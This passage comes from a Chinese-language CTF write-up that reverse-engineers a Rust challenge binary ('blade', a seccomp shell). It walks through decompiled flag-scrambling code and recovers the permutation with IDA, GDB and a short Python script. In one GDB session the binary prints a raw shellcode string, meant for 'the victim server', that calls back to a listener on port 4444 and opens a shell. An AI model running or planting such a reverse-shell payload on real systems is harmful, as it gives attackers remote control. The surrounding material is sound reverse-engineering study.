class="keyword">return</span> v72;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div></li><li>接著是一些不太重要的變數，這裡它把 flag 切成三段：<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">commandString = command;</span><br><span class="line">_rust_alloc();</span><br><span class="line"><span class="keyword">if</span> ( !flag_copy )</span><br><span class="line">  alloc::alloc::handle_alloc_error::<span class="built_in">hd36006f171acb99e</span>();</span><br><span class="line">flag_copy2 = flag_copy;</span><br><span class="line">flag_ptr = *flag;</span><br><span class="line">flag_part1 = flag[<span class="number">1</span>];</span><br><span class="line">flag_part2 = flag[<span class="number">2</span>];</span><br><span class="line">flag_copy[<span class="number">3</span>] = flag[<span class="number">3</span>];</span><br><span class="line">flag_copy[<span class="number">2</span>] = flag_part2;</span><br><span class="line">flag_copy[<span class="number">1</span>] = flag_part1;</span><br><span class="line">*flag_copy = flag_ptr;</span><br><span class="line">flag_copy3 = flag_copy;</span><br><span class="line">v88 = <span class="number">64LL</span>;</span><br><span class="line">v89 = <span class="number">64LL</span>;</span><br></pre></td></tr></table></figure></div></li><li>再來包含一個重複 256 次的外部循環，內部由八個一樣的子循環組成，子循環會以 <code>dest</code> 做為映射表，對 flag 內的字符進行交換操作，並且過程是由 flag 的尾部進行到頭部。<br>此外 <code>core::panicking::panic_bounds_check::h7d0e683548e4cb10()</code>是 rust 編譯器引入的一種錯誤處理機制，用來防止索引訪問越界。<br>整理過後，結構大致如下：<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">  loop_count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    ++loop_count;</span><br><span class="line">    <span class="comment">// 打亂 flag，並重複八次</span></span><br><span class="line">    <span class="built_in">memcpy</span>(dest, <span class="string">&quot;/&quot;</span>, <span class="number">0x200</span>uLL);</span><br><span class="line">    flag_index_from_tail = <span class="number">64LL</span>;</span><br><span class="line">    dest_index = (__int64 *)dest + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      dest_value1 = *(dest_index - <span class="number">1</span>);</span><br><span class="line">      <span class="comment">// swap</span></span><br><span class="line">      <span class="keyword">if</span> ( dest_value1 &gt;= <span class="number">64</span></span><br><span class="line">        || (temp1_1 = *((_BYTE *)flag_copy2 + flag_index_from_tail - <span class="number">1</span>),</span><br><span class="line">            *((_BYTE *)flag_copy2 + flag_index_from_tail - <span class="number">1</span>) = *((_BYTE *)flag_copy2 + dest_value1),</span><br><span class="line">            *((_BYTE *)flag_copy2 + dest_value1) = temp1_1,</span><br><span class="line">            dest_value2 = *dest_index,</span><br><span class="line">            (<span class="type">unsigned</span> __int64)*dest_index &gt; <span class="number">0x3F</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_53:</span><br><span class="line">        core::panicking::panic_bounds_check::<span class="built_in">h7d0e683548e4cb10</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// swap</span></span><br><span class="line">      temp1_2 = *((_BYTE *)flag_copy2 + flag_index_from_tail - <span class="number">2</span>);</span><br><span class="line">      *((_BYTE *)flag_copy2 + flag_index_from_tail - <span class="number">2</span>) = *((_BYTE *)flag_copy2 + dest_value2);</span><br><span class="line">      *((_BYTE *)flag_copy2 + dest_value2) = temp1_2;</span><br><span class="line">      dest_index += <span class="number">2</span>;</span><br><span class="line">      flag_index_from_tail -= <span class="number">2LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( flag_index_from_tail );</span><br></pre></td></tr></table></figure></div></li><li>打亂 flag 後會接一個按位加密的邏輯：<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">// 按位加密</span></span><br><span class="line">  current_index = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    currentValuePlusOne = *((<span class="type">unsigned</span> __int8 *)flag_copy2 + current_index) + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">LOWORD</span>(intermediateValue) = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">LOWORD</span>(current_index2) = <span class="number">257</span>;</span><br><span class="line">    tempResult = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      current_index3 = current_index2;</span><br><span class="line">      <span class="built_in">LOWORD</span>(current_index2) = (<span class="type">unsigned</span> __int16)current_index2 / (<span class="type">unsigned</span> __int16)currentValuePlusOne;</span><br><span class="line">      modResult = current_index3 % (<span class="type">unsigned</span> __int16)currentValuePlusOne;</span><br><span class="line">      tempCalculation = intermediateValue;</span><br><span class="line">      intermediateValue = tempResult - (_DWORD)intermediateValue * (_DWORD)current_index2;</span><br><span class="line">      <span class="built_in">LODWORD</span>(current_index2) = currentValuePlusOne;</span><br><span class="line">      currentValuePlusOne = (<span class="type">unsigned</span> __int16)(current_index3 % (<span class="type">unsigned</span> __int16)currentValuePlusOne);</span><br><span class="line">      tempResult = tempCalculation;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( modResult );</span><br><span class="line">    finalAdjustment = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (__int16)tempCalculation &gt; <span class="number">0</span> )</span><br><span class="line">      finalAdjustment = tempCalculation;</span><br><span class="line">    finalResult = (<span class="type">unsigned</span> __int16)(finalAdjustment + ((__int16)tempCalculation &gt;&gt; <span class="number">15</span>) - tempCalculation) / <span class="number">0x101</span>u</span><br><span class="line">                + tempCalculation</span><br><span class="line">                + ((<span class="type">unsigned</span> __int16)tempCalculation &gt;&gt; <span class="number">15</span>);</span><br><span class="line">    <span class="built_in">LOBYTE</span>(finalResult) = ((<span class="type">unsigned</span> __int16)(finalAdjustment + ((__int16)tempCalculation &gt;&gt; <span class="number">15</span>) - tempCalculation)</span><br><span class="line">                         / <span class="number">0x101</span>u</span><br><span class="line">                         + tempCalculation</span><br><span class="line">                         + ((<span class="type">unsigned</span> __int16)tempCalculation &gt;&gt; <span class="number">15</span>)</span><br><span class="line">                         + <span class="number">113</span>) ^ <span class="number">0x89</span>;</span><br><span class="line">    *((_BYTE *)flag_copy2 + current_index) = finalResult;</span><br><span class="line">    current_index2 = current_index + <span class="number">1</span>;</span><br><span class="line">    current_index = current_index2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( current_index2 != <span class="number">64</span> ); <span class="comment">// flag 長度</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( loop_count != <span class="number">256</span> );</span><br></pre></td></tr></table></figure></div></li><li>寫了 255 個 bytes 到一塊新的空間還有寫 64 個 bytes 到 <code>dest</code>，後面還有一些 TCP 的交互，但具體還看不出來在幹嘛：</li></ol><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 分配 255 字節的內存</span></span><br><span class="line">allocatedMemory = (<span class="type">void</span> *)alloc::raw_vec::RawVec$LT$T$C$A$GT$::allocate_in::<span class="built_in">h9362616e9151d1f3</span>(</span><br><span class="line">                              <span class="number">255LL</span>,</span><br><span class="line">                              <span class="number">0LL</span>,</span><br><span class="line">                              finalResult,</span><br><span class="line">                              <span class="number">64LL</span>,</span><br><span class="line">                              tempCalculation,</span><br><span class="line">                              intermediateValue);</span><br><span class="line">  tempResult1 = tempResult3;</span><br><span class="line">  <span class="comment">// 把某段資料拷貝到剛剛的內存</span></span><br><span class="line">  <span class="built_in">memcpy</span>(allocatedMemory, &amp;unk_62B2B, <span class="number">0xFF</span>uLL);</span><br><span class="line">  memoryBuffer = allocatedMemory;</span><br><span class="line">  tempResult2 = tempResult1;</span><br><span class="line">  dataLength1 = <span class="number">255LL</span>;</span><br><span class="line">  alloc::vec::Vec$LT$T$C$A$GT$::resize::<span class="built_in">h7362553f00beaec8</span>(&amp;memoryBuffer, <span class="number">255LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)(commandString + <span class="number">16</span>) == <span class="number">-1</span> )</span><br><span class="line">    core::panicking::panic::<span class="built_in">h65157a6ac7f1357a</span>();</span><br><span class="line">  commandOffset = commandString + <span class="number">16</span>;</span><br><span class="line">  <span class="comment">// 寫 64 bytes 到 dest</span></span><br><span class="line">  dest[<span class="number">0</span>] = xmmword_60010;</span><br><span class="line">  dest[<span class="number">1</span>] = xmmword_60020;</span><br><span class="line">  dest[<span class="number">2</span>] = xmmword_60030;</span><br><span class="line">  dest[<span class="number">3</span>] = xmmword_60040;</span><br><span class="line">  dataLength = dataLength1;</span><br><span class="line">  <span class="comment">// 根據不同的 dataLength 執行不同的邏輯</span></span><br><span class="line">  <span class="keyword">if</span> ( dataLength1 &lt; <span class="number">0xCD</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_74;</span><br><span class="line">  memoryBuffer1 = memoryBuffer;</span><br><span class="line">  memoryBuffer[<span class="number">204</span>] = *(_BYTE *)flag_copy2;</span><br><span class="line">  <span class="keyword">if</span> ( dataLength &lt; <span class="number">0xE0</span></span><br><span class="line">    || (memoryBuffer1[<span class="number">223</span>] = <span class="number">-89</span>, memoryBuffer1[<span class="number">205</span>] = *((_BYTE *)flag_copy2 + <span class="number">1</span>), dataLength == <span class="number">224</span>)</span><br><span class="line">    || (memoryBuffer1[<span class="number">224</span>] = <span class="number">81</span>, memoryBuffer1[<span class="number">206</span>] = *((_BYTE *)flag_copy2 + <span class="number">2</span>), dataLength &lt; <span class="number">0xE2</span>)</span><br><span class="line">    || (memoryBuffer1[<span class="number">225</span>] = <span class="number">104</span>, memoryBuffer1[<span class="number">207</span>] = *((_BYTE *)flag_copy2 + <span class="number">3</span>), dataLength == <span class="number">226</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_74:</span><br><span class="line">    core::panicking::panic_bounds_check::<span class="built_in">h7d0e683548e4cb10</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  memoryBuffer1[<span class="number">226</span>] = <span class="number">82</span>;</span><br><span class="line">  <span class="comment">// 透過 tcp 發送數據</span></span><br><span class="line">  _$LT$$RF$std..net..tcp..TcpStream$u20$as$u20$std..io..Write$GT$::write::<span class="built_in">h0bbfc2d1fa700c7a</span>();</span><br><span class="line">  <span class="keyword">if</span> ( readBuffer[<span class="number">0</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_50:</span><br><span class="line">    <span class="comment">// 讀取狀態有錯時，進行錯誤處理</span></span><br><span class="line">    errorResponse = _$LT$alloc..boxed..Box$LT$dyn$u20$core..error..Error$GT$$u20$as$u20$core..convert..From$LT$E$GT$$GT$::from::<span class="built_in">ha6d5ca9d25f6de13</span>(readBuffer[<span class="number">1</span>]);</span><br><span class="line">LABEL_71:</span><br><span class="line">    errorResponse1 = errorResponse;</span><br><span class="line">    <span class="keyword">if</span> ( tempResult2 )</span><br><span class="line">      _rust_dealloc();</span><br><span class="line">    _rust_dealloc();</span><br><span class="line">    <span class="keyword">return</span> errorResponse1;</span><br><span class="line">  &#125;</span><br><span class="line">  readBuffer[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="comment">// 正常情況下的數據操作</span></span><br><span class="line">  readResult = std::io::default_read_exact::<span class="built_in">h61fb53e2a02eb302</span>(&amp;commandOffset, readBuffer, <span class="number">8LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( readResult )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_55:</span><br><span class="line">    errorResponse = _$LT$alloc..boxed..Box$LT$dyn$u20$core..error..Error$GT$$u20$as$u20$core..convert..From$LT$E$GT$$GT$::from::<span class="built_in">ha6d5ca9d25f6de13</span>(readResult);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_71;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !readBuffer[<span class="number">0</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_70:</span><br><span class="line">    <span class="comment">// 讀取狀態正常，但是數據不符合預期，進行錯誤處理</span></span><br><span class="line">    _$LT$alloc..boxed..Box$LT$dyn$u20$core..error..Error$GT$$u20$as$u20$core..convert..From$LT$$RF$str$GT$$GT$::from::<span class="built_in">hc50629fd4c285201</span>();</span><br><span class="line">    <span class="keyword">goto</span> LABEL_71;</span><br><span class="line">  &#125;</span><br><span class="line">  dataOffset = <span class="number">4LL</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    dataLength2 = dataLength1;</span><br><span class="line">    <span class="keyword">if</span> ( dataLength1 &lt; <span class="number">0xCD</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_74;</span><br><span class="line">    tempKeyPart = *(_DWORD *)((<span class="type">char</span> *)dest + dataOffset);</span><br><span class="line">    memoryBuffer2 = memoryBuffer;</span><br><span class="line">    memoryBuffer[<span class="number">204</span>] = *((_BYTE *)flag_copy2 + dataOffset);</span><br><span class="line">    <span class="keyword">if</span> ( dataLength2 &lt; <span class="number">0xE0</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_74;</span><br><span class="line">    memoryBuffer2[<span class="number">223</span>] = tempKeyPart;</span><br><span class="line">    memoryBuffer2[<span class="number">205</span>] = *((_BYTE *)flag_copy2 + dataOffset + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( dataLength2 == <span class="number">224</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_74;</span><br><span class="line">    memoryBuffer2[<span class="number">224</span>] = <span class="built_in">BYTE1</span>(tempKeyPart);</span><br><span class="line">    memoryBuffer2[<span class="number">206</span>] = *((_BYTE *)flag_copy2 + dataOffset + <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> ( dataLength2 &lt; <span class="number">0xE2</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_74;</span><br><span class="line">    memoryBuffer2[<span class="number">225</span>] = <span class="built_in">BYTE2</span>(tempKeyPart);</span><br><span class="line">    memoryBuffer2[<span class="number">207</span>] = *((_BYTE *)flag_copy2 + dataOffset + <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> ( dataLength2 == <span class="number">226</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_74;</span><br><span class="line">    memoryBuffer2[<span class="number">226</span>] = <span class="built_in">HIBYTE</span>(tempKeyPart);</span><br><span class="line">    _$LT$$RF$std..net..tcp..TcpStream$u20$as$u20$std..io..Write$GT$::write::<span class="built_in">h0bbfc2d1fa700c7a</span>();</span><br><span class="line">    <span class="keyword">if</span> ( readBuffer[<span class="number">0</span>] )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_50;</span><br><span class="line">    readBuffer[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">    readResult = std::io::default_read_exact::<span class="built_in">h61fb53e2a02eb302</span>(&amp;commandOffset, readBuffer, <span class="number">8LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( readResult )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_55;</span><br><span class="line">    <span class="keyword">if</span> ( !readBuffer[<span class="number">0</span>] )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_70;</span><br><span class="line">    iterationValid = (<span class="type">unsigned</span> __int64)(dataOffset + <span class="number">1</span>) &lt;= <span class="number">0x3C</span>;</span><br><span class="line">    dataOffset += <span class="number">4LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( iterationValid );</span><br><span class="line">  <span class="comment">// 釋放資源</span></span><br><span class="line">  <span class="keyword">if</span> ( tempResult2 )</span><br><span class="line">    _rust_dealloc();</span><br><span class="line">  _rust_dealloc();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="0x3-Exploitation"><a href="#0x3-Exploitation" class="headerlink" title="0x3 Exploitation"></a>0x3 Exploitation</h2><ol><li>首先是要搞清楚打亂順序，這部分可以透過直接比較指定輸入和動態分析打亂結果來得知映射表：</li></ol><ul><li>先紀錄 <code>verify()</code> 的 symbol：</li></ul><p>從 IDA 看</p><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">; __int64 __fastcall seccomp_shell::shell::verify::<span class="built_in">h898bf5fa26dafbab</span>(__int64 command, __int128 *flag, __int64 len)</span><br><span class="line">.text:<span class="number">0000000000012</span>C70 _ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE proc near</span><br><span class="line">.text:<span class="number">0000000000012</span>C70                                         ; CODE XREF: seccomp_shell::shell::prompt::h76cecfe7bd3bdf50+E30↓p</span><br></pre></td></tr></table></figure></div><p>用 objdump 也行：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$ objdump -d ./blade | grep verify</span><br><span class="line">0000000000012c70 &lt;_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE&gt;:</span><br><span class="line">   12c85:       0f 85 6e 05 00 00       jne    131f9 &lt;_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE+0x589&gt;</span><br><span class="line">   12cb0:       0f 84 be 07 00 00       je     13474 &lt;_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE+0x804&gt;</span><br><span class="line">   12d38:       0f 83 eb 04 00 00       jae    13229 &lt;_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE+0x5b9&gt;</span><br><span class="line">   12d56:       0f 87 <span class="built_in">cd</span> 04 00 00       ja     13229 &lt;_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE+0x5b9&gt;</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure></div><p>得 <code>_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE</code>。</p><ul><li>下斷點：</li></ul><p>斷點下的位置要選在八個換位子循環後，按位加密前，之後我們會再模擬重複 256 次</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000012FFC                 movzx   edx, byte ptr [rbx+rax-2]</span><br><span class="line">.text:0000000000013001                 movzx   esi, byte ptr [rbx+rdi]</span><br><span class="line">.text:0000000000013005                 mov     [rbx+rax-2], sil</span><br><span class="line">.text:000000000001300A                 mov     [rbx+rdi], dl</span><br><span class="line">.text:000000000001300D                 add     rcx, 10h</span><br><span class="line">.text:0000000000013011                 add     rax, 0FFFFFFFFFFFFFFFEh</span><br><span class="line">.text:0000000000013015                 jnz     short loc_12FD0</span><br><span class="line">.text:0000000000013017                 xor     ecx, ecx</span><br><span class="line">.text:0000000000013019                 nop     dword ptr [rax+00000000h]</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)*v53 &gt; <span class="number">0x3F</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_53;</span><br><span class="line">  v57 = *((_BYTE *)flag_copy2 + current_index2 - <span class="number">2</span>);</span><br><span class="line">  *((_BYTE *)flag_copy2 + current_index2 - <span class="number">2</span>) = *((_BYTE *)flag_copy2 + v56);</span><br><span class="line">  *((_BYTE *)flag_copy2 + v56) = v57;</span><br><span class="line">  v53 += <span class="number">2</span>;</span><br><span class="line">  current_index2 -= <span class="number">2LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( current_index2 );</span><br><span class="line">current_index = <span class="number">0LL</span>;</span><br></pre></td></tr></table></figure></div><p>這邊選 <code>xor     ecx, ecx</code>，也就是 <code>current_index</code> 歸零的地方，IDA 可以看到位址是 <code>seccomp_shell::shell::verify::h898bf5fa26dafbab + 3A7</code>，flag 的位置從前幾行可以得知在 $rbx。</p><ul><li>GDB 看打亂順序，輸入 <code>1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;</code> (10 + 26 + 26 + 2 &#x3D; 64) 觀察，擷取重要部份如下：</li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">└─$ gdb -q ./blade</span><br><span class="line">gef➤  starti</span><br><span class="line">gef➤  <span class="built_in">break</span> *_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE + 0x3A7</span><br><span class="line">Breakpoint 1 at 0x555555567017</span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.</span><br><span class="line">&gt; server</span><br><span class="line">[!] SYS_socket and SYS_connect should be allowed</span><br><span class="line">server&gt; run</span><br><span class="line">[*] Run the following shellcode on the victim server:</span><br><span class="line"><span class="string">&quot;\xeb\x10\x31\xc0\x53\x5f\x49\x8d\x77\x10\x48\x31\xd2\x80\xc2\xff\x0f\x05\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x50\x5b\x48\x97\x68\x7f\x00\x00\x01\x66\x68\x11\x5c\x66\x6a\x02\x54\x5e\xb2\x10\xb0\x2a\x0f\x05\x4c\x8d\x3d\xc5\xff\xff\xff\x41\xff\xe7&quot;</span></span><br><span class="line">[*] Waiting <span class="keyword">for</span> connection on 127.0.0.1:4444</span><br><span class="line"><span class="comment"># ./shellcode</span></span><br><span class="line">[+] Connection established from 127.0.0.1:33568</span><br><span class="line">$ flag 1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x0000555555567017 <span class="keyword">in</span> seccomp_shell::shell::verify::h898bf5fa26dafbab ()</span><br><span class="line">gef➤  x/s <span class="variable">$rbx</span></span><br><span class="line">0x5555555d63e0: <span class="string">&quot;HfVl&#123;qPcCYNMoRi7D8Jr&#125;espOL4FhwdWAtTGZba5Ugjvnx2QkKE3IS0yuz6BX19m&quot;</span></span><br></pre></td></tr></table></figure></div><ul><li>用 python 字典建立映射表和反映射表：<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">original = <span class="string">&#x27;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;&#x27;</span></span><br><span class="line">shuffled = <span class="string">&#x27;HfVl&#123;qPcCYNMoRi7D8Jr&#125;espOL4FhwdWAtTGZba5Ugjvnx2QkKE3IS0yuz6BX19m&#x27;</span></span><br><span class="line"></span><br><span class="line">char_to_shuffled_map = &#123;c: shuffled[i] <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(original)&#125;</span><br><span class="line">suffled_to_char_map = &#123;shuffled[i]: c <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(original)</span><br></pre></td></tr></table></figure></div></li></ul><ol start="2"><li>再來要建立按位加密的映射表：</li></ol><ul><li>下斷點：</li></ul><p>斷點這次會下在按位加密後，外部循環前，從 IDA 左側的虛線可以很方便地去判斷迴圈架構：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/blade_enc.png"                      alt="enc"                ><br>選擇下在 <code>cmp     r13d, 100h</code> 的位置，也就是 <code>seccomp_shell::shell::verify::h898bf5fa26dafbab + 42E</code>。</p><ul><li>GDB 動態分析：<br>操作大部分和前面類似，值得一題的是加密後的 flag 會有不可視字元，所以這裡換成十六進位顯示：<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td 